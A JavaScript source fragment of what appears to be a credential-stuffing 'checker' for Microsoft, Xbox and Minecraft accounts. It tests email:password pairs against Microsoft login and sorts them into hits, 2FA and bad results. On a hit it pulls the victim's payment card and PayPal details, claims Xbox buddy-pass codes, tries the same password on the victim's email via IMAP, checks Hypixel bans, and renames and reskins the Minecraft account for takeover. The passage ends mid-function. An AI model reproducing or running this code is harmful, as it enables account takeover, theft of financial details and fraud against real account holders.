    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Cache-Control": "max-age=0",
    "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "sec-ch-ua-platform-version": '"12.0.0"',
    Origin: "https://login.live.com",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    Referer: "https://login.live.com/oauth20_authorize.srf?nopa=2&client_id=7d5c843b-fe26-45f7-9073-b683b2ac7ec3&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&contextid=F3FB0F6AB3D6991E&ru=https%3A%2F%2Fuser.auth.xboxlive.com%2Fdefault.aspx&flowtoken=-Dlvz*VDmPVZZLUB5XJxsfDMTTcQljOxDsdPjDKzToqZjduHY6H8mvZDBmfh64KLbJ2nZ9eoEak3Z5i9cv6QnWc1AgKNCTVjbsdSkMM2udkvn*tMhRNlP*KMzWSv4xope0Tedsx0fH4ExWXxj47d!shbqu5cb72XzFK*iJMoesP5oeS*!QeCOp1srGs2ds7c0wcllXOmhW9BF5JvWeVnY4ggTVh*w4TUyV!keqrvHLOJZENELnYgCp5EjzPwdp2QPhnupdnWEyUzkQIzzXeB0HN4BAZJhJpQo3U8Hd3J4Z16oG7vbJZEpdHLpaxVe7RfSvg%24%24&uaid=b1d1e6fbf8b24f9b8a73b347b178d580&opid=5F188DEDF4A1266A",
    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8,ku;q=0.7,ro;q=0.6",
  };

  let currentTry = 0;
  while (currentTry <= Math.min(2, maxretries)) {
    try {
      const res = await fetch(`${url}?${params}`, {
        method: "POST",
        headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" },
        body: payload.toString(),
        redirect: "follow",
        signal: AbortSignal.timeout(15000),
      });

      const statusCode = res.status;
      const responseText = (await res.text()).toLowerCase();

      if (statusCode >= 500 || statusCode === 429) {
        currentTry++;
        await sleep(isNoProxy() ? randomFloat(20, 30) * 1000 : 1500);
        continue;
      }

      const twoFaIndicators = [
        "suggestedaction", "sign in to continue", "enter code", "two-step",
        "two. step", "two factor", "2fa", "second verification", "verification code",
        "authenticator", "texted you", "sent a code", "enter the code",
        "additional security", "extra security",
      ];
      if (twoFaIndicators.some((ind) => responseText.includes(ind))) {
        return "2FA";
      }

      const successIndicators = [
        "to do that, sign in", "welcome", "redirecting", "location.href",
        "home.live.com", "account.microsoft.com", "myaccount.microsoft.com",
        "profile.microsoft.com", "https://account.live.com/", "microsoft account home",
        "signed in successfully", "you're signed in",
      ];
      if (successIndicators.some((ind) => responseText.includes(ind))) {
        return "HIT";
      }

      const failureIndicators = [
        "invalid username or password", "that microsoft account doesn't exist",
        "incorrect password", "your account or password is incorrect",
        "sorry, that password isn't right", "entered is incorrect",
        "account doesn't exist", "no account found", "wrong password",
        "incorrect credentials", "login failed", "sign in unsuccessful",
        "we couldn't find an account", "please check your credentials",
        "sign-in was blocked", "account is locked", "suspended",
        "temporarily locked", "security challenge", "unusual activity",
        "verify your identity", "account review", "safety concerns",
      ];
      if (failureIndicators.some((ind) => responseText.includes(ind))) {
        return "BAD";
      }

      return "UNKNOWN";
    } catch {
      currentTry++;
      await sleep(1500);
    }
  }
  return "ERROR";
}

// ── get_urlPost_sFTTag ───────────────────────────────────────

async function getUrlPostSFTTag(jar) {
  let attempts = 0;
  while (attempts < maxretries) {
    try {
      const headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
      };

      const { text } = await sessionFetch(sFTTag_url, { method: "GET", headers }, jar, config.timeout * 1000);

      const match = RE_SFTTAG_VALUE.exec(text);
      if (match) {
        const sFTTag = match[1] || match[2] || match[3] || match[4] || match[5];
        if (sFTTag) {
          const matchUrl = RE_URLPOST_VALUE.exec(text);
          if (matchUrl) {
            let urlPost = matchUrl[1] || matchUrl[2] || matchUrl[3] || matchUrl[4];
            if (urlPost) {
              urlPost = urlPost.replace(/&amp;/g, "&");
              return { urlPost, sFTTag };
            }
          }
        }
      }
    } catch {}

    stats.retries++;
    attempts++;
    await sleep(isNoProxy() ? 15000 : 100);
  }
  return { urlPost: null, sFTTag: null };
}

// ── get_xbox_rps ─────────────────────────────────────────────

async function getXboxRps(jar, email, password, urlPost, sFTTag) {
  let tries = 0;
  while (tries < maxretries) {
    try {
      const data = new URLSearchParams({
        login: email, loginfmt: email, passwd: password, PPFT: sFTTag,
      });
      const headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        Connection: "close",
      };

      const { text: responseText, finalUrl } = await sessionFetch(urlPost, {
        method: "POST",
        headers,
        body: data.toString(),
      }, jar, config.timeout * 1000);

      if (finalUrl.includes("#") && finalUrl !== sFTTag_url) {
        const parsed = new URL(finalUrl);
        const fragment = parsed.hash.slice(1);
        const params = new URLSearchParams(fragment);
        const token = params.get("access_token");
        if (token && token !== "None") return token;
      }

      if (responseText.includes("cancel?mkt=")) {
        try {
          const iptMatch = RE_IPT.exec(responseText);
          const ppridMatch = RE_PPRID.exec(responseText);
          const uaidMatch = RE_UAID.exec(responseText);
          const actionMatch = RE_ACTION_FMHF.exec(responseText);

          if (iptMatch && ppridMatch && uaidMatch && actionMatch) {
            const formData = new URLSearchParams({
              ipt: iptMatch[0], pprid: ppridMatch[0], uaid: uaidMatch[0],
            });
            const { text: retText } = await sessionFetch(actionMatch[0], {
              method: "POST",
              headers: { "Content-Type": "application/x-www-form-urlencoded" },
              body: formData.toString(),
            }, jar, config.timeout * 1000);

            const returnUrlMatch = RE_RETURN_URL.exec(retText);
            if (returnUrlMatch) {
              const { finalUrl: finUrl } = await sessionFetch(returnUrlMatch[0], { method: "GET" }, jar, config.timeout * 1000);
              const parsed2 = new URL(finUrl);
              const fragment2 = parsed2.hash.slice(1);
              const params2 = new URLSearchParams(fragment2);
              const token2 = params2.get("access_token");
              if (token2 && token2 !== "None") return token2;
            }
          }
        } catch {}
      }

      if (["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="].some((v) => responseText.includes(v))) {
        results_2fa.push(`${email}:${password}`);
        return "2FA";
      }

      const badIndicators = ["password is incorrect", "account doesn't exist", "that microsoft account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password", "help us protect your account"];
      if (badIndicators.some((v) => responseText.toLowerCase().includes(v))) {
        return "None";
      }

      stats.retries++;
      tries++;
      await sleep(100);
    } catch {
      stats.retries++;
      tries++;
      await sleep(isNoProxy() ? 2000 : 100);
    }
  }
  return "None";
}

// ── mc_token ─────────────────────────────────────────────────

async function getMcToken(jar, uhs, xstsToken) {
  let attempts = 0;
  while (attempts < maxretries) {
    attempts++;
    try {
      const res = await fetch("https://api.minecraftservices.com/authentication/login_with_xbox", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ identityToken: `XBL3.0 x=${uhs};${xstsToken}` }),
        signal: AbortSignal.timeout(15000),
      });
      if (res.status === 429) {
        await sleep(isNoProxy() ? randomFloat(5, 10) * 1000 : 500);
        continue;
      }
      const data = await res.json();
      return data.access_token || null;
    } catch {
      stats.retries++;
      await sleep(isNoProxy() ? 2000 : 100);
    }
  }
  return null;
}

// ── payment extraction ───────────────────────────────────────

async function extractPayment(jar, email, password) {
  let attempts = 0;
  while (attempts < maxretries) {
    attempts++;
    try {
      const headers1 = {
        Host: "login.live.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        Connection: "close",
        Referer: "https://account.microsoft.com/",
      };
      const { finalUrl } = await sessionFetch(
        "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none",
        { method: "GET", headers: headers1 },
        jar,
        config.timeout * 1000
      );

      const parsed = new URL(finalUrl);
      const fragment = parsed.hash.slice(1);
      const tokenParams = new URLSearchParams(fragment);
      const token = tokenParams.get("access_token") || "None";

      const headers2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        Pragma: "no-cache",
        Accept: "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        Authorization: `MSADELEGATE1.0=${token}`,
        Connection: "keep-alive",
        "Content-Type": "application/json",
        Host: "paymentinstruments.mp.microsoft.com",
        Origin: "https://account.microsoft.com",
        Referer: "https://account.microsoft.com/",
      };

      const piRes = await fetch("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB", {
        headers: headers2,
        signal: AbortSignal.timeout(config.timeout * 1000),
      });
      const piText = await piRes.text();

      const dateRegistered = lrParse(piText, '"creationDateTime":"', "T", false);
      const fullname = lrParse(piText, '"accountHolderName":"', '"', false);
      const address1 = lrParse(piText, '"address":{"address_line1":"', '"');
      const cardHolder = lrParse(piText, 'accountHolderName":"', '","');
      const creditCard = lrParse(piText, 'paymentMethodFamily":"credit_card","display":{"name":"', '"');
      const expiryMonth = lrParse(piText, 'expiryMonth":"', '",');
      const expiryYear = lrParse(piText, 'expiryYear":"', '",');
      const last4 = lrParse(piText, 'lastFourDigits":"', '",');
      const paypalEmail = lrParse(piText, 'email":"', '"', false);
      const balance = lrParse(piText, 'balance":', ',"', false);

      let city = "", region = "", zipcode = "", cardType = "", cod = "";
      try {
        const jsonData = JSON.parse(piText);
        if (Array.isArray(jsonData)) {
          for (const item of jsonData) {
            if (item.city) city = item.city;
            if (item.region) region = item.region;
            if (item.postal_code) zipcode = item.postal_code;
            if (item.cardType) cardType = item.cardType;
            if (item.country) cod = item.country;
          }
        }
      } catch {}

      // Transactions
      const txRes = await fetch("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", {
        headers: headers2,
        signal: AbortSignal.timeout(config.timeout * 1000),
      });
      const txText = await txRes.text();

      const ctpid = lrParse(txText, '"subscriptionId":"ctp:', '"');
      const item1 = lrParse(txText, '"title":"', '"');
      const autoRenew = lrParse(txText, `"subscriptionId":"ctp:${ctpid}","autoRenew":`, ",");
      const startDate = lrParse(txText, '"startDate":"', "T");
      const nextRenewalDate = lrParse(txText, '"nextRenewalDate":"', "T");

      const hasPayment = creditCard || paypalEmail || balance;
      if (hasPayment) {
        if (creditCard && last4) {
          const cardCapture = `${email}:${password} | Card: ${creditCard} | Last4: ${last4} | Exp: ${expiryMonth}/${expiryYear} | Type: ${cardType} | Holder: ${cardHolder}`;
          results_cards.push(cardCapture);
        }
        if (paypalEmail) {
          results_cards.push(`${email}:${password} | PayPal: ${paypalEmail} | Holder: ${fullname || "N/A"}`);
        }
        stats.payment_methods++;
      }

      return {
        dateRegistered, fullname, address1, cardHolder, creditCard,
        expiryMonth, expiryYear, last4, paypalEmail, balance,
        city, region, zipcode, cardType, cod,
        item1, autoRenew, startDate, nextRenewalDate,
      };
    } catch {
      stats.retries++;
      await sleep(2000);
    }
  }
  return null;
}

// ── claim_buddypass_offers ───────────────────────────────────

async function claimBuddypassOffers(jar, xboxToken) {
  const codes = [];
  try {
    let xstsRes;
    for (let i = 0; i < maxretries; i++) {
      try {
        xstsRes = await fetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
          method: "POST",
          headers: { "Content-Type": "application/json", Accept: "application/json" },
          body: JSON.stringify({
            Properties: { SandboxId: "RETAIL", UserTokens: [xboxToken] },
            RelyingParty: "http://mp.microsoft.com/",
            TokenType: "JWT",
          }),
          signal: AbortSignal.timeout(config.timeout * 1000),
        });
        break;
      } catch {
        stats.retries++;
        await sleep(proxylist.length === 0 ? 20000 : 100);
      }
    }
    if (!xstsRes) return;

    const js = await xstsRes.json();
    if (!js.DisplayClaims?.xui?.[0]) return;
    const uhss = js.DisplayClaims.xui[0].uhs;
    const xstsToken = js.Token;

    const headers = {
      Accept: "*/*",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
      Authorization: `XBL3.0 x=${uhss};${xstsToken}`,
      Origin: "https://www.xbox.com",
      Referer: "https://www.xbox.com/",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
      "X-Ms-Api-Version": "1.0",
    };

    let r;
    for (let i = 0; i < maxretries; i++) {
      try {
        r = await fetch("https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers", {
          headers,
          signal: AbortSignal.timeout(config.timeout * 1000),
        });
        break;
      } catch {
        stats.retries++;
      }
    }
    if (!r) return;

    const rText = await r.text();
    if (rText.toLowerCase().includes("offerid")) {
      const rJson = JSON.parse(rText);
      const offers = rJson.offers || [];
      const currentTime = new Date();

      for (const offer of offers) {
        codes.push(offer.offerId);
      }

      if (offers.length < 5) {
        for (let i = 0; i < 3; i++) {
          try {
            const genRes = await fetch("https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB", {
              method: "POST",
              headers,
              signal: AbortSignal.timeout(config.timeout * 1000),
            });
            const genText = await genRes.text();
            if (genText.includes("offerId")) {
              const genJson = JSON.parse(genText);
              const newOffers = genJson.offers || [];
              let shouldContinue = false;
              for (const offer of newOffers) {
                if (!codes.includes(offer.offerId)) {
                  shouldContinue = true;
                  if (!offer.claimed) {
                    const expiration = new Date(offer.expiration);
                    if (expiration > currentTime) {
                      results_codes.push(offer.offerId);
                    }
                  }
                }
                codes.push(offer.offerId);
              }
              if (!shouldContinue) break;
            } else break;
          } catch {
            stats.retries++;
          }
        }
      }
    }
  } catch {}
}

// ── Hypixel check ────────────────────────────────────────────

async function hypixelCheck(name, jar) {
  const result = { hypixl: null, level: null, firstlogin: null, lastlogin: null, bwstars: null };
  if (!config.hypixelname && !config.hypixellevel && !config.hypixelfirstlogin && !config.hypixellastlogin && !config.hypixelbwstars) return result;
  if (!name || name === "N/A") return result;

  try {
    const res = await fetch(`https://plancke.io/hypixel/player/stats/${name}`, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Accept-Encoding": "gzip, deflate",
      },
      signal: AbortSignal.timeout(8000),
    });
    const tx = await res.text();

    if (config.hypixelname) {
      let match = HYPIXEL_NAME.exec(tx);
      if (match) {
        result.hypixl = match[0];
        const titleMatch = HYPIXEL_TITLE.exec(tx);
        if (titleMatch) result.hypixl = titleMatch[1];
        else {
          const brute = new RegExp(`\\[(VIP\\+?|MVP\\+\\+?|YOUTUBE|ADMIN|MOD|HELPER)\\]\\s*${name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`, "i");
          const bm = brute.exec(tx);
          if (bm) result.hypixl = bm[0];
        }
      }
      if (result.hypixl && (result.hypixl.includes("View player,") || result.hypixl.toLowerCase().includes("not found") || result.hypixl.toLowerCase().includes("plancke"))) {
        result.hypixl = "N/A";
      }
    }

    if (config.hypixellevel) {
      const m = HYPIXEL_LEVEL.exec(tx);
      if (m) result.level = m[0];
    }
    if (config.hypixelfirstlogin) {
      const m = FIRST_LOGIN.exec(tx);
      if (m) result.firstlogin = m[0];
    }
    if (config.hypixellastlogin) {
      const m = LAST_LOGIN.exec(tx);
      if (m) result.lastlogin = m[0];
    }
    if (config.hypixelbwstars) {
      const m = BW_STARS.exec(tx);
      if (m) result.bwstars = m[0];
    }
  } catch {
    stats.errors++;
  }
  return result;
}

// ── Optifine check ───────────────────────────────────────────

async function optifineCheck(name) {
  if (!config.optifinecape || !config.optifine_cape) return "Unknown";
  if (!name || name === "N/A") return "Unknown";
  try {
    const res = await fetch(`http://s.optifine.net/capes/${name}.png`, { signal: AbortSignal.timeout(8000) });
    const txt = await res.text();
    return txt.includes("Not found") ? "No" : "Yes";
  } catch {
    return "Unknown";
  }
}

// ── IMAP email access check (from Capture.full_access) ───────

async function checkEmailAccess(email, password) {
  if (!config.access || !config.email_access) return "Unknown";
  try {
    const domain = email.split("@")[1]?.toLowerCase();
    if (!domain) return "False";

    let imapServer = "";
    if (domain.includes("gmail.com") || domain.includes("googlemail.com")) imapServer = "imap.gmail.com";
    else if (domain.includes("yahoo")) imapServer = "imap.mail.yahoo.com";
    else if (domain.includes("outlook") || domain.includes("hotmail") || domain.includes("live")) imapServer = "outlook.office365.com";
    else if (domain.includes("icloud") || domain.includes("me.com") || domain.includes("mac.com")) imapServer = "imap.mail.me.com";
    else if (domain.includes("aol.com")) imapServer = "imap.aol.com";
    else imapServer = `imap.${domain}`;

    return await new Promise((resolve) => {
      const timeout = setTimeout(() => resolve("Unknown"), 10000);
      try {
        const socket = tls.connect(993, imapServer, { rejectUnauthorized: false }, () => {
          let buf = "";
          socket.on("data", (data) => {
            buf += data.toString();
            if (buf.includes("OK")) {
              socket.write(`a1 LOGIN "${email}" "${password}"\r\n`);
              buf = "";
              socket.once("data", (loginData) => {
                const loginResp = loginData.toString();
                clearTimeout(timeout);
                if (loginResp.includes("OK")) {
                  socket.write("a2 LOGOUT\r\n");
                  socket.end();
                  resolve("True");
                } else {
                  socket.end();
                  resolve("False");
                }
              });
            }
          });
          socket.on("error", () => {
            clearTimeout(timeout);
            resolve("Unknown");
          });
        });
        socket.on("error", () => {
          clearTimeout(timeout);
          resolve("Unknown");
        });
      } catch {
        clearTimeout(timeout);
        resolve("Unknown");
      }
    });
  } catch {
    return "Unknown";
  }
}

// ── Name change check (from Capture.namechange) ──────────────

async function namechangeCheck(token) {
  if (!config.namechange && !config.lastchanged) return { namechanged: null, lastchanged: null };
  const result = { namechanged: null, namechangeAvailable: false, lastchanged: null };
  let tries = 0;
  while (tries < maxretries) {
    try {
      const res = await fetch("https://api.minecraftservices.com/minecraft/profile/namechange", {
        headers: { Authorization: `Bearer ${token}` },
        signal: AbortSignal.timeout(10000),
      });
      if (res.ok) {
        const data = await res.json();
        if (config.namechange && config.name_change_availability) {
          result.namechanged = String(data.nameChangeAllowed || "N/A");
          result.namechangeAvailable = !!data.nameChangeAllowed;
        }
        if (config.lastchanged && config.last_name_change) {
          const createdAt = data.createdAt;
          if (createdAt) {
            const givenDate = new Date(createdAt);
            const now = new Date();
            const diffDays = Math.floor((now - givenDate) / (1000 * 60 * 60 * 24));
            const years = Math.floor(diffDays / 365);
            const months = Math.floor((diffDays % 365) / 30);
            const formatted = `${(givenDate.getMonth() + 1).toString().padStart(2, "0")}/${givenDate.getDate().toString().padStart(2, "0")}/${givenDate.getFullYear()}`;
            if (years > 0) result.lastchanged = `${years} ${years === 1 ? "year" : "years"} - ${formatted} - ${createdAt}`;
            else if (months > 0) result.lastchanged = `${months} ${months === 1 ? "month" : "months"} - ${formatted} - ${createdAt}`;
            else result.lastchanged = `${diffDays} ${diffDays === 1 ? "day" : "days"} - ${formatted} - ${createdAt}`;
          }
        }
        break;
      }
      if (res.status === 429) await sleep(500);
    } catch {}
    tries++;
  }
  return result;
}

// ── Capture builder ──────────────────────────────────────────

function buildCaptureLine(c) {
  let banStatus;
  if (c.banned === null || c.banned === undefined) banStatus = "[Unknown]";
  else if (String(c.banned).startsWith("[Error]")) banStatus = "[Unknown]";
  else if (c.banned && c.banned !== "False") banStatus = "[Banned]";
  else banStatus = "[Unbanned]";

  const tags = [];
  const typeUpper = String(c.type || "").toUpperCase();
  if (typeUpper.includes("GAME PASS") || typeUpper.includes("XGP")) {
    tags.push(typeUpper.includes("ULTIMATE") || typeUpper.includes("XGPU") ? "[XGPU]" : "[XGP]");
  }
  if (typeUpper.includes("MINECRAFT") || typeUpper.includes("MC")) tags.push("[MC]");
  if (c.sfa) tags.push("[SFA]");
  if (String(c.type).includes("NFA")) tags.push("[NFA]");
  else if (String(c.type).includes("SFA")) tags.push("[SFA]");
  else if (String(c.type).includes("UFA")) tags.push("[UFA]");
  if (c.capes) tags.push(`[${c.capes}]`);
  if (c.cape === "Yes") tags.push("[Optifine]");
  if (c.sbcoins || c.sbnetworth) tags.push("[Skyblock]");
  if (c.swstars) tags.push("[SkyWars]");

  let hypixelLevel = "";
  if (c.level && parseFloat(c.level) > 0) hypixelLevel = `[Lvl:${c.level}]`;

  const statsParts = [];
  if (c.bwstars && parseInt(c.bwstars) > 0) statsParts.push(`BW: ${c.bwstars}`);
  if (c.swstars && !["N/A", "", "0"].includes(String(c.swstars)) && parseInt(c.swstars) > 0) statsParts.push(`SW: ${c.swstars}`);
  if (c.sbcoins && !["N/A", "", "None"].includes(String(c.sbcoins))) statsParts.push(`Sb_Coins: ${c.sbcoins}`);
  if (c.sbnetworth && !["N/A", "", "None"].includes(String(c.sbnetworth))) statsParts.push(`Sb_Networth: ${c.sbnetworth}`);
  if (c.pitcoins && !["N/A", "", "None"].includes(String(c.pitcoins))) statsParts.push(`Pit_Coins: ${c.pitcoins}`);

  const tagsStr = tags.join("");
  const statsStr = statsParts.length ? statsParts.join(", ") : "";
  const userDisplay = c.hypixl && c.hypixl !== "N/A" ? c.hypixl : c.name && c.name !== "N/A" ? c.name : "Unknown";

  let line = `[${userDisplay}] ${banStatus} ${tagsStr}${hypixelLevel} ${c.email}:${c.password}`;
  if (statsStr) line += ` [Hypixel: ${statsStr}]`;
  return line;
}

// ── Hypixel Ban Check ────────────────────────────────────────

let banproxies = [];

function loadBanProxies() {
  try {
    const bp = path.join(__dirname, "..", "..", "banproxies.txt");
    if (fs.existsSync(bp)) {
      banproxies = fs.readFileSync(bp, "utf-8").split("\n").map(l => l.trim()).filter(Boolean);
    }
  } catch {}
}

async function checkBan(name, uuid, token) {
  if (!MINECRAFT_AVAILABLE || !config.hypixelban) return null;
  if (!name || name === "N/A" || !token) return null;

  let banned = null;
  let tries = 0;

  while (tries < maxretries) {
    try {
      const client = mc.createClient({
        host: "mc.hypixel.net",
        port: 25565,
        username: name,
        session: {
          accessToken: token,
          selectedProfile: { id: uuid, name },
        },
        auth: "manual",
        version: "1.8.9",
        hideErrors: true,
        skipValidation: true,
      });

      banned = await new Promise((resolve) => {
        const timeout = setTimeout(() => {
          try { client.end(); } catch {}
          resolve("[Error] Connection Timeout/No Packet");
        }, 30000);

        client.on("disconnect", (packet) => {
          clearTimeout(timeout);
          try {
            const data = JSON.parse(packet.reason);
            const dataStr = JSON.stringify(data);

            if (dataStr.includes("temporarily banned")) {
              try {
                const duration = data.extra[4].text.trim();
                const banId = data.extra[8].text.trim();
                resolve(`[${data.extra[1].text}] ${duration} Ban ID: ${banId}`);
              } catch {
                resolve("Temporarily Banned");
              }
              return;
            }
            if (dataStr.includes("Suspicious activity")) {
              try {
                const banId = data.extra[6].text.trim();
                resolve(`[Permanently] Suspicious activity has been detected on your account. Ban ID: ${banId}`);
              } catch {
                resolve("[Permanently] Suspicious activity");
              }
              return;
            }
            if (dataStr.includes("You are permanently banned from this server!")) {
              try {
                const reason = data.extra[2].text.trim();
                const banId = data.extra[6].text.trim();
                resolve(`[Permanently] ${reason} Ban ID: ${banId}`);
              } catch {
                resolve("[Permanently] Banned");
              }
              return;
            }
            if (dataStr.includes("The Hypixel Alpha server is currently closed!") ||
                dataStr.includes("Failed cloning your SkyBlock data")) {
              resolve("False");
              return;
            }

            const extraList = data.extra || [];
            let fullMsg = extraList.filter(x => typeof x === "object").map(x => x.text || "").join("");
            if (!fullMsg) fullMsg = data.text || "";
            resolve(fullMsg || JSON.stringify(data));
          } catch (e) {
            resolve(`Error parsing ban: ${e.message}`);
          }
        });

        client.on("login", () => {
          clearTimeout(timeout);
          resolve("False");
          setTimeout(() => { try { client.end(); } catch {} }, 1000);
        });

        client.on("position", () => {
          clearTimeout(timeout);
          if (banned === null) {
            resolve("False");
            setTimeout(() => { try { client.end(); } catch {} }, 1000);
          }
        });

        client.on("error", (err) => {
          clearTimeout(timeout);
          const errStr = String(err);
          if (errStr.includes("RateLimiter") || errStr.includes("429")) {
            resolve("[Error] Rate Limit");
          } else if (errStr.includes("multiplayer.access.banned")) {
            resolve(`[Ban] ${errStr}`);
          } else {
            resolve(`[Error] ${errStr.slice(0, 120)}`);
          }
        });
      });

      if (banned && !String(banned).startsWith("[Error]")) break;
      if (banned && String(banned).startsWith("[Error]") && tries < maxretries - 1) {
        banned = null;
        await sleep(1000);
        tries++;
        continue;
      }
      break;
    } catch (e) {
      banned = `[Error] ${String(e.message || e).slice(0, 120)}`;
      if (tries < maxretries - 1) {
        banned = null;
        await sleep(1000);
      }
      tries++;
    }
  }

  return banned;
}

// ── Set Name ─────────────────────────────────────────────────

async function setMcName(token, currentName) {
  if (!config.setname) return null;
  const nameFormat = config.name || "Player";
  let newname = nameFormat;
  while (newname.includes("{random_letter}"))
    newname = newname.replace("{random_letter}", String.fromCharCode(97 + Math.floor(Math.random() * 26)));
  while (newname.includes("{random_number}"))
    newname = newname.replace("{random_number}", String(Math.floor(Math.random() * 10)));
  while (newname.includes("{random_string}")) {
    const rs = Array.from({ length: 3 }, () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)]).join("");
    newname = newname.replace("{random_string}", rs);
  }
  if (newname === nameFormat && newname.length < 13) {
    const suf = Array.from({ length: 3 }, () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)]).join("");
    newname = `${newname}_${suf}`;
  }

  let tries = 0;
  while (tries < maxretries) {
    try {
      const r = await fetch(`https://api.minecraftservices.com/minecraft/profile/name/${newname}`, {
        method: "PUT",
        headers: { Authorization: `Bearer ${token}` },
        signal: AbortSignal.timeout(10000),
      });
      if (r.status === 200) return { newName: newname, tag: " [SET MC]" };
      if (r.status === 429) await sleep(500);
    } catch {}
    tries++;
  }
  return null;
}

// ── Set Skin ─────────────────────────────────────────────────

async function setMcSkin(token) {
  if (!config.setskin) return false;
  const skinUrl = config.skin || "http://textures.minecraft.net/texture/31f477eb1a7beee631c2ca64d06f8f68fa93a3386d04452ab27f43acdf1b60cb";
  const variant = config.variant || "classic";

  let tries = 0;
  while (tries < maxretries) {
    try {
      const r = await fetch("https://api.minecraftservices.com/minecraft/profile/skins", {
        method: "POST",
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
        body: JSON.stringify({ url: skinUrl, variant }),
        signal: AbortSignal.timeout(10000),
      });
      if (r.status === 200) return true;
      if (r.status === 429) await sleep(500);
    } catch {}
    tries++;
  }
  return false;
}



async function handleCapture(email, password, name, capes, uuid, token, type, jar) {
  const c = {
    email, password, name, capes, uuid, token, type,
    hypixl: null, level: null, firstlogin: null, lastlogin: null,
    cape: null, access: null, sbcoins: null, bwstars: null,
    banned: null, namechanged: null, namechangeAvailable: false,
    lastchanged: null, ms_balance: null, ms_rewards: null,
    ms_payment_methods: [], ms_orders: [], inbox_matches: [],
    swstars: null, sbnetworth: null, pitcoins: null, sfa: false,
  };

  if (name && name !== "N/A") {
    // Hypixel
    try {
      const hx = await hypixelCheck(name, jar);
      Object.assign(c, hx);
    } catch { stats.errors++; }

    // Optifine
    try {
      c.cape = await optifineCheck(name);
      if (c.cape === "Yes") stats.optifine_capes++;
    } catch { stats.errors++; }

    if (capes) stats.minecraft_capes++;

    // Email access
    try {
      c.access = await checkEmailAccess(email, password);
      if (c.access === "True") {
        stats.mfa++;
        results_mfa.push(`${email}:${password}${c.hypixl && c.hypixl !== "N/A" ? ` | ${c.hypixl}` : ""}`);
      } else {
        stats.sfa++;
        results_sfa.push(`${email}:${password}`);
      }
    } catch { stats.errors++; }

    // Name change
    try {
      const nc = await namechangeCheck(token);
      Object.assign(c, nc);
      if (nc.namechangeAvailable) stats.name_changes++;
    } catch { stats.errors++; }

    // Ban check via minecraft-protocol (1:1 port of pyCraft logic)
    try {
      c.banned = await checkBan(name, uuid, token);
      if (c.banned && c.banned !== "False" && !String(c.banned).startsWith("[Error]")) {
        stats.banned++;
        results_banned.push(`${email}:${password}`);
      } else if (c.banned === "False") {
        stats.unbanned++;
        results_unbanned.push(`${email}:${password}`);
      }
    } catch { stats.errors++; }

    // Set Name
    try {
      const nameResult = await setMcName(token, name);
      if (nameResult) {
        c.type = (c.type || "") + nameResult.tag;
        c.name = c.name + ` -> ${nameResult.newName}`;
      }
    } catch { stats.errors++; }

    // Set Skin
    try {
